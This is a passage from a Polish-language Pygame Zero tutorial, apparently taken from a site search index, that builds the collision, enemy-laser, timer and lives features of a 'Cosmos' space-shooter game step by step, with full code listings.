poniewa\u017c ich tak\u017ce b\u0119dziemy usuwa\u0107.</p> <pre><code>def update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n</code></pre> <p>Mamy wi\u0119c ju\u017c par\u0119 laser-przeciwnik, mo\u017cemy wi\u0119c sprawdzi\u0107, czy s\u0105 w kolizji, korzystaj\u0105c z metody colliderect.</p> <pre><code>def update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n</code></pre> <p>Je\u017celi trafili\u015bmy w przeciwnika, to usuwamy go z listy enemies_list za pomoc\u0105 metody remove.</p> <pre><code>def update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n</code></pre> <p>Podobnie robimy z laserem, usuwaj\u0105c go z listy player_lasers_list.</p> <pre><code>def update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n                player_lasers_list.remove(laser)\n</code></pre> <p>Na koniec dodajemy instrukcj\u0119 break, tak by wyj\u015b\u0107 z p\u0119tli przechodz\u0105cej przez przeciwnik\u00f3w i przej\u015b\u0107 do kolejnego obrotu p\u0119tli z laserami. Dzi\u0119ki temu raz usuni\u0119ty laser nie b\u0119dzie m\u00f3g\u0142 ju\u017c zlikwidowa\u0107 innych przeciwnik\u00f3w.</p> <pre><code>def update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n                player_lasers_list.remove(laser)\n                break\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#sprawdzamy-zderzenia-z-przeciwnikami","title":"Sprawdzamy zderzenia z przeciwnikami","text":"<p>Nasi przeciwnicy nie tylko b\u0119d\u0105 strzela\u0107 laserami (tym zajmiemy si\u0119 za chwil\u0119), ale b\u0119d\u0105 stanowi\u0107 tak\u017ce zagro\u017cenie kolizyjne. Gdy zderzymy si\u0119 z przeciwnikiem, ten zostanie zniszczony, ale my stracimy \u017cycie. Zanim jednak przejdziemy to utraty \u017cy\u0107, musimy je dopisa\u0107 do naszego gracza. Zapiszemy je w zmiennej lifes gracza i nadamy pocz\u0105tkow\u0105 warto\u015b\u0107 \\(3\\). \u017bycia dopisujemy zaraz pod maksymaln\u0105 pr\u0119dko\u015bci\u0105.</p> <pre><code>player.lifes = 3\n</code></pre> <p>Przejd\u017amy teraz do kolizji z przeciwnikami. Nowe instrukcje dopiszemy na koniec funkcji update_collisions. Na pocz\u0105tku przejdziemy p\u0119tl\u0105 iteracyjn\u0105 przez wszystkich przeciwnik\u00f3w na kopii listy (poniewa\u017c b\u0119dziemy ich usuwa\u0107), by sprawdzi\u0107, czy kt\u00f3ry\u015b si\u0119 z nami zderzy\u0142.</p> <pre><code>def update_collisions():\n    ...\n\n    for enemy in enemies_list[:]:\n</code></pre> <p>Teraz mo\u017cemy sprawdzi\u0107, czy dosz\u0142o do kolizji. Aby gra by\u0142a bardziej grywalna i kolizje nie by\u0142y wykrywane gdy tylko prostok\u0105ty reprezentuj\u0105ce grafiki postaci si\u0119 dotkn\u0105, tym razem skorzystamy z metody collidepoint. Wykonamy j\u0105 na graczu, a jako parametr podamy pozycj\u0119 przeciwnika (enemy.pos). Dzi\u0119ki temu kolizja zostanie wykryta tylko wtedy, gdy \u015brodek przeciwnika znajdzie si\u0119 wewn\u0105trz prostok\u0105ta reprezentuj\u0105cego grafik\u0119 gracza.</p> <pre><code>def update_collisions():\n    ...\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n</code></pre> <p>W przypadku wykrycia kolizji usuwamy przeciwnika z listy przeciwnik\u00f3w.</p> <pre><code>def update_collisions():\n    ...\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n</code></pre> <p>Zmniejszamy tak\u017ce liczb\u0119 \u017cy\u0107 gracza o jeden.</p> <pre><code>def update_collisions():\n    ...\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n</code></pre> <p>Je\u017celi \u017cycia gracza spadn\u0105 do zera, to gra si\u0119 zako\u0144czy i zostanie odtworzony d\u017awi\u0119k game_over. W tym celu sprawdzamy, czy gracz ma ju\u017c zero \u017cy\u0107.</p> <pre><code>def update_collisions():\n    ...\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n            if player.lifes == 0:\n</code></pre> <p>Je\u017celi tak, to odtwarzamy d\u017awi\u0119k game_over.</p> <pre><code>def update_collisions():\n    ...\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#strzelamy-laserami","title":"Strzelamy laserami","text":"<p>Nasi przeciwnicy tak\u017ce powinni strzela\u0107 laserami. Dlatego wewn\u0105trz p\u0119tli, kt\u00f3r\u0105 przed chwil\u0105 stworzyli\u015bmy, dopiszemy nowe instrukcje na sam koniec, poniewa\u017c chcemy, by ka\u017cdy przeciwnik m\u00f3g\u0142 strzela\u0107. Strza\u0142y b\u0119dziemy oddawa\u0107 losowo, podobnie jak zrobili\u015bmy z dodawaniem nowych przeciwnik\u00f3w. Dlatego zaczynamy od instrukcji warunkowej. Jako warunek sprawdzimy, czy wylosowana liczba rzeczywista jest odpowiednio ma\u0142a, np. mniejsza od \\(0.005\\).</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies:\n        ...\n\n        if random.random() &lt; 0.005:\n</code></pre> <p>Je\u017celi tak, do tworzymy nowego aktora z grafiki laser2.png i zapisujemy go w zmiennej laser.</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies:\n        ...\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n</code></pre> <p>Naszemu laserowi nadajemy tak\u0105 sam\u0105 pozycj\u0119 (laser.pos) jak pozycja przeciwnika (enemy.pos).</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies:\n        ...\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n</code></pre> <p>Podobnie post\u0119pujemy z k\u0105tem (angle).</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies:\n        ...\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n</code></pre> <p>Je\u017celi chodzi o pr\u0119dko\u015b\u0107 (laser.v), to mo\u017cemy wylosowa\u0107 liczb\u0119 ca\u0142kowit\u0105 z wybranego przedzia\u0142u, np. \\(&lt;5,10&gt;\\).</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies:\n        ...\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n</code></pre> <p>Teraz mo\u017cemy ju\u017c doda\u0107 nasz laser do listy laser\u00f3w przeciwnika (enemy_lasers_list).</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies:\n        ...\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n            enemy_lasers_list.append(laser)\n</code></pre> <p>Warto tak\u017ce odtworzy\u0107 d\u017awi\u0119k laser2.</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies:\n        ...\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n            enemy_lasers_list.append(laser)\n            sounds.laser2.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#rysujemy-lasery_1","title":"Rysujemy lasery","text":"<p>Mamy ju\u017c lasery, czas je wi\u0119c narysowa\u0107. Wewn\u0105trz funkcji draw dopisujemy instrukcj\u0119 <code>draw_list(enemy_lasers_list)</code> zaraz przed narysowaniem przeciwnik\u00f3w, aby lasery by\u0142y pod nimi schowane.</p> <pre><code>def draw():\n    ...\n    draw_list(enemy_lasers_list)\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#poruszamy-laserami_1","title":"Poruszamy laserami","text":"<p>Nasze lasery s\u0105 statyczne, pora wi\u0119c si\u0119 tym zaj\u0105\u0107. B\u0119dziemy modyfikowa\u0107 funkcj\u0119 update_enemy_lasers, z kt\u00f3rej usuwamy instrukcj\u0119 pass. Chcemy przemieszcza\u0107 wszystkie lasery Na pocz\u0105tku przejdziemy p\u0119tl\u0105 przez wszystkie lasery na kopii listy laser\u00f3w przeciwnika (enemy_lasers_list). Potrzebujemy kopii listy, poniewa\u017c b\u0119dziemy usuwa\u0107 lasery po opuszczeniu ekranu gry.</p> <pre><code>def update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n</code></pre> <p>Przemieszczamy laser zgodnie z jego kierunkiem obrotu, identycznie jak to zrobili\u015bmy z laserami gracza.</p> <pre><code>def update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n</code></pre> <p>Teraz pora sprawdzi\u0107, czy laser opu\u015bci\u0142 ekran gry, uwzgl\u0119dniaj\u0105c przy tym margines. Post\u0119pujemy tutaj tak samo, jak przy laserach gracza.</p> <pre><code>def update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n</code></pre> <p>Je\u017celi tak si\u0119 sta\u0142o, to usuwamy laser z listy laser\u00f3w przeciwnika.</p> <pre><code>def update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            enemy_lasers_list.remove(laser)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#sprawdzamy-kolizje","title":"Sprawdzamy kolizje","text":"<p>Mamy ju\u017c lasery przeciwnik\u00f3w, czas wi\u0119c sprawdzi\u0107, czy kt\u00f3ry\u015b w nas trafi. W tym celu wracamy do naszej funkcji update_collisions i dopisujemy nowe instrukcje na jej ko\u0144cu. Poniewa\u017c chcemy sprawdzi\u0107, czy kt\u00f3rykolwiek laser w nas trafi\u0142, to zaczynamy od p\u0119tli przechodz\u0105cej przez kopi\u0119 listy laser\u00f3w przeciwnika.</p> <pre><code>def update_collisions():\n    ...\n\n    for laser in enemy_lasers_list[:]:\n</code></pre> <p>Teraz sprawdzamy, czy laser trafi\u0142 w gracza. Ponownie skorzystamy z metody collidepoint wywo\u0142anej na graczu, a jako parametr podamy pozycj\u0119 lasera (laser.pos).</p> <pre><code>def update_collisions():\n    ...\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n</code></pre> <p>Je\u017celi laser w nas trafi\u0142, to usuwamy go z listy laser\u00f3w przeciwnika.</p> <pre><code>def update_collisions():\n    ...\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n</code></pre> <p>Zmniejszamy tak\u017ce \u017cycia gracza o jeden.</p> <pre><code>def update_collisions():\n    ...\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n</code></pre> <p>Podobnie jak wcze\u015bniej, w przypadku ko\u0144ca gry chcemy odtworzy\u0107 odpowiedni d\u017awi\u0119k. Sprawdzamy wi\u0119c, czy \u017cycia gracza spad\u0142y do zera.</p> <pre><code>def update_collisions():\n    ...\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n            if player.lifes == 0:\n</code></pre> <p>Je\u017celi tak, to odtwarzamy d\u017awi\u0119k game_over.</p> <pre><code>def update_collisions():\n    ...\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#peny-kod_3","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer = Actor(\"player\")\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\nplayer.v = 2\nplayer.va = 2\nplayer.ac = 0.2\nplayer.maxv = 8\nplayer.lifes = 3\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    draw_list(player_lasers_list)\n    draw_list(enemy_lasers_list)\n    draw_list(enemies_list)\n    player.draw()\n    draw_lifes()\n\ndef draw_list(list):\n    for element in list:\n        element.draw()\n\ndef draw_lifes():\n    pass\n\ndef update():\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n\n    if keyboard.A:\n        player.angle += player.va\n\n    if keyboard.D:\n        player.angle -= player.va\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = player.maxv\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n\ndef update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            player_lasers_list.remove(laser)\n\ndef update_enemies():\n    if random.random() &lt; 0.01:\n        add_enemy()\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos) - 90\n        enemy.x += math.sin(math.radians(enemy.angle - 180)) * enemy.v\n        enemy.y += math.cos(math.radians(enemy.angle - 180)) * enemy.v\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n            enemy_lasers_list.append(laser)\n            sounds.laser2.play()\n\ndef update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            enemy_lasers_list.remove(laser)\n\ndef update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n                player_lasers_list.remove(laser)\n                break\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\ndef on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n        sounds.laser1.play()\n\ndef add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n    enemy.v = random.randint(2, 5)\n    enemies_list.append(enemy)\n\ndef choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n        y = random.choice([-MARGIN, HEIGHT + MARGIN])\n\n    return x, y\n\ndef add_time():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#czas","title":"Czas","text":"<p>Zajmiemy si\u0119 teraz czasem, kt\u00f3ry b\u0119dzie swoistymi punktami w naszej grze. Im d\u0142u\u017cej uda nam si\u0119 przetrwa\u0107, tym lepiej. Musimy jednak mie\u0107 jakie\u015b miejsce do przechowywania warto\u015bci czasu. Czas b\u0119dziemy reprezentowa\u0107 w sekundach, wystarczy nam wi\u0119c zwyk\u0142a liczba. Do naszego gracza dopiszemy zmienn\u0105 time i nadamy jej warto\u015b\u0107 \\(0\\). Now\u0105 zmienn\u0105 dopisujemy zaraz pod \u017cyciami gracza.</p> <pre><code>player.time = 0\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#wyswietlamy-czas","title":"Wy\u015bwietlamy czas","text":"<p>Teraz mo\u017cemy wy\u015bwietli\u0107 czas na ekranie, zanim przejdziemy do jego up\u0142ywu. Na ko\u0144cu funkcji draw dopisujemy instrukcj\u0119 wypisuj\u0105c\u0105 tekst na ekranie (screen.draw.text). Jako tekst do wy\u015bwietlenia podamy tekstow\u0105 reprezentacj\u0119 czasu przypisanego do gracza (str(player.time)). \u015arodek tekstu (center) umie\u015bcimy na \u015brodku ekranu w poziomie (WIDTH/2) z niewielkim marginesem od g\u00f3ry (\\(40\\)). Jako rozmiar czcionki (fontsize) przyjmiemy warto\u015b\u0107 \\(80\\), a kolor (color) ustawimy na \u017c\u00f3\u0142ty (yellow).</p> <pre><code>def draw():\n    ...\n    screen.draw.text(str(player.time), center=(WIDTH / 2, 40), fontsize=80, color=\"yellow\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#aktualizujemy-czas","title":"Aktualizujemy czas","text":"<p>Czas si\u0119 ju\u017c wy\u015bwietla, czas wi\u0119c go zaktualizowa\u0107. Najpierw zajmiemy si\u0119 nasz\u0105 funkcj\u0105 add_time, z kt\u00f3rej usuwamy instrukcj\u0119 pass. Czas b\u0119dziemy zwi\u0119ksza\u0107 tylko wtedy, gdy gracz jest jeszcze \u017cywy, tzn. gdy ma wi\u0119cej \u017cy\u0107 ni\u017c \\(0\\). Dlatego na pocz\u0105tku sprawdzamy, czy tak rzeczywi\u015bcie jest.</p> <pre><code>def add_time():\n    if player.lifes &gt; 0:\n</code></pre> <p>Je\u017celi gracz wci\u0105\u017c \u017cyje, to zwi\u0119kszamy czas o jeden.</p> <pre><code>def add_time():\n    if player.lifes &gt; 0:\n        player.time += 1\n</code></pre> <p>Nasz\u0105 funkcj\u0119 zwi\u0119kszaj\u0105c\u0105 czas musimy jednak jako\u015b wywo\u0142a\u0107. Chcemy zlicza\u0107 up\u0142yw sekund, powinni\u015bmy wi\u0119c funkcj\u0119 wywo\u0142ywa\u0107 co jedn\u0105 sekund\u0119. Z pomoc\u0105 przyjdzie nam funkcja clock.schedule_interval z biblioteki Pygame Zero. Jako parametry podamy nazw\u0119 funkcji add_time oraz liczb\u0119 sekund okre\u015blaj\u0105c\u0105 odst\u0119p czasowy do kolejnych wywo\u0142a\u0144 funkcji. W naszym przypadku b\u0119dzie to oczywi\u015bcie \\(1\\). Now\u0105 instrukcj\u0119 dopisujemy na samym ko\u0144cu naszego kodu, zaraz przed pgzrun.go(), tak aby czas zacz\u0105\u0142 by\u0107 zliczany jak tylko rozpoczniemy gr\u0119.</p> <pre><code>clock.schedule_interval(add_time, 1)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#peny-kod_4","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer = Actor(\"player\")\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\nplayer.v = 2\nplayer.va = 2\nplayer.ac = 0.2\nplayer.maxv = 8\nplayer.lifes = 3\nplayer.time = 0\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    draw_list(player_lasers_list)\n    draw_list(enemy_lasers_list)\n    draw_list(enemies_list)\n    player.draw()\n    draw_lifes()\n    screen.draw.text(str(player.time), center=(WIDTH / 2, 40), fontsize=80, color=\"yellow\")\n\ndef draw_list(list):\n    for element in list:\n        element.draw()\n\ndef draw_lifes():\n    pass\n\ndef update():\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n\n    if keyboard.A:\n        player.angle += player.va\n\n    if keyboard.D:\n        player.angle -= player.va\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = player.maxv\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n\ndef update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            player_lasers_list.remove(laser)\n\ndef update_enemies():\n    if random.random() &lt; 0.01:\n        add_enemy()\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos) - 90\n        enemy.x += math.sin(math.radians(enemy.angle - 180)) * enemy.v\n        enemy.y += math.cos(math.radians(enemy.angle - 180)) * enemy.v\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n            enemy_lasers_list.append(laser)\n            sounds.laser2.play()\n\ndef update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            enemy_lasers_list.remove(laser)\n\ndef update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n                player_lasers_list.remove(laser)\n                break\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\ndef on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n        sounds.laser1.play()\n\ndef add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n    enemy.v = random.randint(2, 5)\n    enemies_list.append(enemy)\n\ndef choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n        y = random.choice([-MARGIN, HEIGHT + MARGIN])\n\n    return x, y\n\ndef add_time():\n    if player.lifes &gt; 0:\n        player.time += 1\n\nclock.schedule_interval(add_time, 1)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#zycia","title":"\u017bycia","text":"<p>Teraz zajmiemy si\u0119 wy\u015bwietleniem \u017cy\u0107 gracza na ekranie. Zrobimy to praktycznie tak samo jak w przypadku gry Asteroidy. \u017bycia narysujemy w lewym g\u00f3rnym rogu ekranu za pomoc\u0105 grafik ma\u0142ego statku. Grafika, kt\u00f3rej u\u017cyjemy, nazywa si\u0119 life.png. Do rysowania \u017cy\u0107 wykorzystamy nasz\u0105 funkcj\u0119 draw_lifes, z kt\u00f3rej usuwamy instrukcj\u0119 draw.</p> <p>B\u0119dziemy rysowa\u0107 tyle \u017cy\u0107, na ile wskazuje zmienna player.lifes. W zwi\u0105zku z tym potrzebna nam p\u0119tla. U\u017cyjemy p\u0119tli for z licznikiem life_id, kt\u00f3ry b\u0119dzie oznacza\u0142 numer obecnie rysowanego \u017cycia, a jako zakres przejdziemy od \\(1\\) do liczby \u017cy\u0107 statku w\u0142\u0105cznie, czyli  <code>range(1, player.lifes + 1)</code>.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n</code></pre> <p>Wewn\u0105trz p\u0119tli zaczniemy od utworzenia nowego aktora na podstawie grafiki life.png. Zapiszemy go w zmiennej life.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n        life = Actor(\"life\")\n</code></pre> <p>Teraz czas wyznaczy\u0107 wsp\u00f3\u0142rz\u0119dne naszego \u017cycia. Poniewa\u017c chcemy, by by\u0142y u\u0142o\u017cone obok siebie w jednej linii, to wsp\u00f3\u0142rz\u0119dna \\(x\\) b\u0119dzie zale\u017cna od numeru aktualnie rysowanego \u017cycia. Narysujemy \u017cycia tak, aby by\u0142y obok siebie, ale na siebie nie nachodzi\u0142y. Dlatego warto\u015b\u0107 wsp\u00f3\u0142rz\u0119dnej poziomej to nic innego jak numer \u017cycia przemno\u017cony przez szeroko\u015b\u0107 grafiki \u017cycia. Szeroko\u015b\u0107 grafiki aktora mo\u017cemy \u0142atwo pozna\u0107 pisz\u0105c life.width.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n</code></pre> <p>Je\u017celi chodzi o po\u0142o\u017cenie w pionie, to nasze \u017cycia b\u0119d\u0105 dotyka\u0107 g\u00f3rnego brzegu ekranu, ale nie powinny poza niego wychodzi\u0107. W tym celu do wsp\u00f3\u0142rz\u0119dnej \\(y\\) przypiszemy po\u0142ow\u0119 wysoko\u015bci grafiki \u017cycia. Wysoko\u015b\u0107 grafiki aktora mo\u017cemy pobra\u0107 podobnie jak szeroko\u015b\u0107: life.height.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n</code></pre> <p>Pozosta\u0142o nam narysowa\u0107 naszego aktora na ekranie korzystaj\u0105c z metody draw.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n        life.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#peny-kod_5","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer = Actor(\"player\")\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\nplayer.v = 2\nplayer.va = 2\nplayer.ac = 0.2\nplayer.maxv = 8\nplayer.lifes = 3\nplayer.time = 0\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    draw_list(player_lasers_list)\n    draw_list(enemy_lasers_list)\n    draw_list(enemies_list)\n    player.draw()\n    draw_lifes()\n    screen.draw.text(str(player.time), center=(WIDTH / 2, 40), fontsize=80, color=\"yellow\")\n\ndef draw_list(list):\n    for element in list:\n        element.draw()\n\ndef draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n        life.draw()\n\ndef update():\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n\n    if keyboard.A:\n        player.angle += player.va\n\n    if keyboard.D:\n        player.angle -= player.va\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = 